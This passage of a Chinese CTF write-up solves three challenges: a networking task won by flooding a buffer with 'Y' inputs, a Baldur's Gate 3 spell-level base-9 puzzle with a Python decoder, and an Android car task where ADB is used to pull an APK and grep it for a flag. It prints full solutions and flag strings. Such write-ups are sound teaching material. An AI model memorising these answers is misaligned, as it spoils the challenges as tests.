        return
    }

    if getFlag[0] == 'Y' {
        _, err = c.Write([]byte(os.Getenv("flag")))
        if err != nil {
            log.Println(err)
            return
        }
    }
}
```

看了代码，HMAC-SHA256，期望的值和给的值没有什么联系，好像对错都无所谓，只要耗尽了缓冲区就能结束游戏。手动发送31个Y(回车算一个字符)，持续一会就好（pwn库发会被强迫结束连接）：

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714319665821-5827ab60-f95f-4793-854c-4a743a61ecd2.png)

d3ctf{1\_10ve\_n4tvv0rk1n9\_4nd\_R0uting!!!}

### Baldur's Gate 3 Complete Spell List

> As we all know, there are nine spell levels in dnd5e. Although one spell level is missing in Baldur's Gate 3, it doesn't matter. I replaced the 8th level spells with '8'.

应该就是按法术阶级对法术名进行替换编码，一共九级，博德之门少个第8级就直接用数字8代替（大概

<https://game8.co/games/Baldurs-Gate-III/archives/417755>

直接找个网站查，手动替换 :(

法术对应等级：

```php
[
  {
    "1": "Protection from Poison -2- ", 
    "2": "Protection from Energy: Thunder -3- ",
    "3": "Soul Ascension -6- "
  },
  {
    "1": "Cloud of Daggers -2- ",
    "2": "Blight -4- ",
    "3": "Aegis of the Absolute -9- "
  },
  {
    "1": "Mirror Image -2- ",
    "2": "Mapped Terror: Ceremorphosis -4- ",
    "3": "Aegis of the Absolute -9- "
  },
  {
    "1": "Detect Thoughts -2- ",
    "2": "Dimension Door -4- ",
    "3": "Dominate Person -5- "
  },
  {
    "1": "Knock -2- ",
    "2": "Conjure Woodland Being -4- ",
    "3": "8"
  },
  {
    "1": "Finger of Death -7- ",
    "2": "Planar Binding -5- "
  },
  {
    "1": "Planar Ally -6- ",
    "2": "Fanatic Retaliation -3- "
  },
  {
    "1": "Tyrant's Bindings -6- ",
    "2": "Blinding Smite -3- "
  },
  {
    "1": "Gust of Wind -2- ",
    "2": "Remove Curse -3- ",
    "3": "Aegis of the Absolute -9- "
  },
  {
    "1": "Mirror Image -2- ",
    "2": "Conjure Woodland Being -4- ",
    "3": "Beckoning Darkness -4- "
  },
  {
    "1": "Arcane Lock -2- ",
    "2": "Spiritual Weapon: Maul -2- ",
    "3": "8"
  },
  {
    "1": "Misty Step -2- ",
    "2": "Kereska's Favour -4- ",
    "3": "Colour Spray -1- "
  },
  {
    "1": "Eagle's Splendour -2- ",
    "2": "Darkvision (spell) -2- ",
    "3": "8"
  },
  {
    "1": "Scorching Ray -2- ",
    "2": "Conjure Minor Elemental: Mud Mephits -4- ",
    "3": "8"
  },
  {
    "1": "Scorching Ray -2- ",
    "2": "Conjure Minor Elemental: Ice Mephits -4- ",
    "3": "Power Word Kill -9- "
  },
  {
    "1": "Aid -2- ",
    "2": "Igniting Spark -4- ",
    "3": "Frost of Dark Winter -4- "
  },
  {
    "1": "Lunar Flare -2- ",
    "2": "Stoneskin -4- ",
    "3": "Power Word Kill -9- "
  },
  {
    "1": "Owl's Wisdom -2- ",
    "2": "Bestow Curse: Wisdom Disadvantage -3- ",
    "3": "Sunbeam -6- "
  },
  {
    "1": "Arcane Lock -2- ",
    "2": "Bestow Curse: Charisma Disadvantage -3- ",
    "3": "Glyph of Warding: Detonation -3- "
  },
  {
    "1": "Ray of Enfeeblement -2- ",
    "2": "Fire Shield: Warm -4- ",
    "3": "Enthrall -2- "
  },
  {
    "1": "Enthrall -2- ",
    "2": "Prayer of Healing -2- ",
    "3": "8"
  },
  {
    "1": "Pass Without Trace -2- ",
    "2": "Flame Strike -5- ",
    "3": "Conjure Minor Elemental: Ice Mephits -4- "
  },
  {
    "1": "Conjure Elemental: Fire Myrmidon -6- ",
    "2": "Phantasmal Force -2- "
  },
  {
    "1": "Bear's Endurance -2- ",
    "2": "Counterspell -3- ",
    "3": "Hex (Intelligence) -1- "
  },
  {
    "1": "Darkness -2- ",
    "2": "Mark of Putrefaction -4- ",
    "3": "Hordestrike -4- "
  },
  {
    "1": "Silence -2- ",
    "2": "Banishment -4- ",
    "3": "Rays of Fire -2- "
  },
  {
    "1": "Hellfire Orb -6- ",
    "2": "Vampiric Touch -3- "
  },
  {
    "1": "8",
    "2": "Pierce the Weak -1- "
  },
  {
    "1": "Prayer of Healing -2- ",
    "2": "Fox's Cunning -2- ",
    "3": "8"
  },
  {
    "1": "Aegis of the Absolute -9- ",
    "2": "Faithwarden's Vines -1- "
  },
  {
    "1": "Cloud of Daggers -2- ",
    "2": "Hex (Intelligence) -1- ",
    "3": "Move Moonbeam -2- "
  },
  {
    "1": "Silvered Bulwark -6- ",
    "2": "Withering Touch -4- "
  },
  {
    "1": "Branding Smite (Ranged) -2- ",
    "2": "Elemental Weapon: Lightning -3- ",
    "3": "Sleep -1- "
  },
  {
    "1": "Power Word Kill -9- ",
    "2": "Healing Word -1- "
  },
  {
    "1": "Aegis of the Absolute -9- ",
    "2": "Harm -6- "
  },
  {
    "1": "Finger of Death -7- ",
    "2": "Divine Smite -1- "
  },
  {
    "1": "Power Word Kill -9- ",
    "2": "Conjure Elemental -5- "
  },
  {
    "1": "Melf's Acid Arrow -2- ",
    "2": "Conjure Elemental: Fire Elemental -5- ",
    "3": "Conjure Elemental: Earth Elemental -5- "
  },
  {
    "1": "Finger of Death -7- ",
    "2": "Fire Shield -4- "
  },
  {
    "1": "Fox's Cunning -2- ",
    "2": "Castigate Heartform -4- ",
    "3": "Teleport to Submersible -5- "
  },
  {
    "1": "Power Word Kill -9- ",
    "2": "Banishing Smite (Melee) -5- "
  },
  {
    "1": "Mirror Image -2- ",
    "2": "Death Ward -4- ",
    "3": "Bestow Curse: Attack Disadvantage -3- "
  },
  {
    "1": "8",
    "2": "Stoneskin -4- "
  },
  {
    "1": "Reduce -2- ",
    "2": "Banishing Smite (Ranged) -5- ",
    "3": "Darkness -2- "
  },
  {
    "1": "Moonbeam -2- ",
    "2": "Fear -3- ",
    "3": "Disguise Self: Femme Dwarf -1- "
  },
  {
    "1": "Heal -6- ",
    "2": "Finger of Death -7- "
  },
  {
    "1": "Heat Metal: Reapply Damage -2- ",
    "2": "Hail of Thorns -1- ",
    "3": "Fleeting Dream -2- "
  },
  {
    "1": "Knock -2- ",
    "2": "Dominate Beast -4- ",
    "3": "Perturbing Visage -5- "
  },
  {
    "1": "Invisibility -2- ",
    "2": "Darkness -2- ",
    "3": "Aegis of the Absolute -9- "
  },
  {
    "1": "Spiritual Weapon: Greatsword -2- ",
    "2": "Tasha's Hideous Laughter -1- ",
    "3": "Finger of Death -7- "
  },
  {
    "1": "Web -2- ",
    "2": "Bestow Curse: Dread -3- ",
    "3": "Chromatic Orb: Cold -1- "
  },
  {
    "1": "Shatter -2- ",
    "2": "Perturbing Visage -5- ",
    "3": "Hex -1- "
  },
  {
    "1": "Ray of Enfeeblement -2- ",
    "2": "Bludgeon the Weak -1- ",
    "3": "Power Word Kill -9- "
  },
  {
    "1": "Disintegrate -6- ",
    "2": "Otiluke's Freezing Sphere -6- "
  },
  {
    "1": "Aegis of the Absolute -9- ",
    "2": "Eyebite: Sickened -6- "
  },
  {
    "1": "Rays of Fire -2- ",
    "2": "Terrifying Visage -5- ",
    "3": "Darkness -2- "
  },
  {
    "1": "Power Word Kill -9- ",
    "2": "8"
  },
  {
    "1": "Pass Without Trace -2- ",
    "2": "Disguise Self: Masc Strong Human -1- ",
    "3": "Circle of Death -6- "
  },
  {
    "1": "Branding Smite (Melee) -2- ",
    "2": "Fireball -3- ",
    "3": "Incinerate -6- "
  },
  {
    "1": "Diabolic Chains -6- ",
    "2": "8"
  },
  {
    "1": "Power Word Kill -9- ",
    "2": "Arcane Gate -6- "
  },
  {
    "1": "Aegis of the Absolute -9- ",
    "2": "Disguise Self: Femme Githyanki -1- "
  },
  {
    "1": "Darkvision (spell) -2- ",
    "2": "Gaseous Form -3- ",
    "3": "Sethan: Spiritual Greataxe -6- "
  },
  {
    "1": "Branding Smite (Melee) -2- ",
    "2": "Polymorph -4- ",
    "3": "See Invisibility (Spell) -2- "
  },
  {
    "1": "Bull's Strength -2- ",
    "2": "Bestow Curse: Wisdom Disadvantage -3- ",
    "3": "Tyr's Protection -1- "
  },
  {
    "1": "Flesh to Stone -6- ",
    "2": "Conjure Elemental: Fire Myrmidon -6- "
  },
  {
    "1": "Hold Person -2- ",
    "2": "Flame of Wrath -4- ",
    "3": "8"
  },
  {
    "1": "Owl's Wisdom -2- ",
    "2": "Dethrone -5- ",
    "3": "Barkskin -2- "
  },
  {
    "1": "Phantasmal Force -2- ",
    "2": "Web -2- ",
    "3": "Reapply Hunter's Mark -1- "
  },
  {
    "1": "Spiritual Weapon: Trident -2- ",
    "2": "Bone-shaking Thunder -4- ",
    "3": "Blindness -2- "
  },
  {
    "1": "Magic Weapon -2- ",
    "2": "Elemental Retort -5- ",
    "3": "Grasping Vine -4- "
  },
  {
    "1": "Enlarge -2- ",
    "2": "Glyph of Warding: Detonation -3- ",
    "3": "Harm -6- "
  },
  {
    "1": "Spiritual Weapon: Spear -2- ",
    "2": "Lunar Flare -2- ",
    "3": "Healing Word -1- "
  },
  {
    "1": "Lunar Flare -2- ",
    "2": "Destructive Wave -5- ",
    "3": "Destructive Wave -5- "
  },
  {
    "1": "Arcane Gate -6- ",
    "2": "Aegis of the Absolute -9- "
  },
  {
    "1": "Silence -2- ",
    "2": "Animate Dead: Flying Ghoul -5- ",
    "3": "Fanatic Retaliation -3- "
  },
  {
    "1": "Move Moonbeam -2- ",
    "2": "Protection from Poison -2- ",
    "3": "Aegis of the Absolute -9- "
  },
  {
    "1": "Rays of Fire -2- ",
    "2": "Conjure Minor Elemental -4- ",
    "3": "Invisibility -2- "
  },
  {
    "1": "Spiritual Weapon: Spear -2- ",
    "2": "Elemental Age -3- ",
    "3": "Shar's Aegis -1- "
  },
  {
    "1": "Finger of Death -7- ",
    "2": "8"
  }
]
```

```php
import json
import re

# 加载JSON文件
data = [
  {
    "1": "Protection from Poison -2- ", 
    "2": "Protection from Energy: Thunder -3- ",
    "3": "Soul Ascension -6- "
  },
  # ... 省略其他数据 ...
]

# 初始化一个空列表来存储每个对象中的数字
numbers = []

# 遍历JSON文件中的每个对象
for obj in data:
    # 初始化一个临时字符串来存储当前对象中的数字
    temp = ''
    # 对每个对象的值进行正则表达式匹配，提取出所有的数字
    for value in obj.values():
        match = re.search(r' -(\d+)- |8', value)
        if match:
            # 将提取出的数字添加到临时字符串中
            temp += match.group(1) if match.group(1) else '8'
    # 将临时字符串添加到主列表中
    numbers.append(temp)

# 将主列表中的所有字符串用空格分隔，然后打印出来
print(' '.join(numbers))
```

提取出来是

```php
236 249 249 245 248 75 63 63 239 244 228 241 228 248 249 244 249 236 233 242 228 254 62 231 244 242 63 81 228 91 212 64 231 91 96 71 95 255 74 245 95 243 84 252 231 67 212 245 229 217 231 251 219 66 96 252 98 216 236 68 96 91 236 242 231 66 248 252 221 242 254 236 221 255 69 253 229 242 231 78
```

很显然是九进制，由于法术阶级是1-9，所以都要减一，再进行进制转换

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714319932796-3fcda49a-1158-41e5-ad8f-f9868d9ce0cd.png)

写个脚本将九进制转换为字符

```php
m=[125,138,138,134,137,64,52,52,128,133,117,130,117,137,138,133,138,125,122,131,117,143,51,120,133,131,52,70,117,80,101,53,120,80,85,60,84,144,63,134,84,132,73,141,120,56,101,134,118,106,120,140,108,55,85,141,87,105,125,57,85,80,125,131,120,55,137,141,110,131,143,125,110,144,58,142,118,131,120,67]
ans=''

def base9_to_decimal(base9_str):
    decimal_number = 0
    for i, digit in enumerate(reversed(base9_str)):
        decimal_number += int(digit) * (9 ** i)
    return decimal_number

for i in range(len(m)):
    ans+=chr(base9_to_decimal(str(m[i])))
    print(ans)

# https://koalastothemax.com/?aHR0cHM6Ly9pLnBvc3RpbWcuY2MvOVh4MHhmc2svZmxhZy5wbmc=
```

得到个url，参数很奇怪，一眼base64

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714320055582-96535a91-a92f-420f-8252-b853d20483b2.png)

访问，得到一个二维码

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714320072173-cd1a9196-5c21-47a9-9fc2-1324ba8a0ecd.png)

扫描得到

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714320101005-65a4762f-ec48-465b-b7e9-dc6104d56f81.png)

0x05 IOV
--------

### D3\_car\_1

> 一辆灵车，创飞了很多人。
> 
> PS:1.本题目开放的端口分别是adb端口和安卓启动端口 需要nc到安卓启动端口后 等待安卓启动后 才能通过adb接入主机
> 
> 本题共有3个flag
> 
> A hearse, flying over many people.
> 
> PS: 1. The open ports for this task are the ADB port and the Android startup port. You need to nc to the Android startup port, wait for Android to start up, and then connect to the host via ADB.
> 
> There are 3 flags in this task.
> 
> 本题由杭州凌武科技提供 Powered by Lingwu Tech

启动安卓服务后，adb直接连

`pm list packages`查看包，发现有个 `com.d3car.factory`

`pm list packages -f com.d3car.factory`找到文件路径后，下载到本地

```php
adb pull /system/priv-app/D3Factory/D3Factory.app ./d3car.apk
```

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714320257425-0c10cbc9-1317-4e67-8b8e-e5350b04d9dd.png)

解压，直接grep，应该是最简单的第一个flag：

![](https://cdn.nlark.com/yuque/0/2024/png/35980243/1714320542230-d15ae2d5-8739-4972-a069-68366aae097c.png)

当然，用jadx反编译也能看出来

0x06 总结
-------

虽然出现了平台崩了和题目泄露exp的事故?，但总体上题的质量还是可以的，可以看出出题人对这方面有研究，学习到了很多，希望后面再接再厉！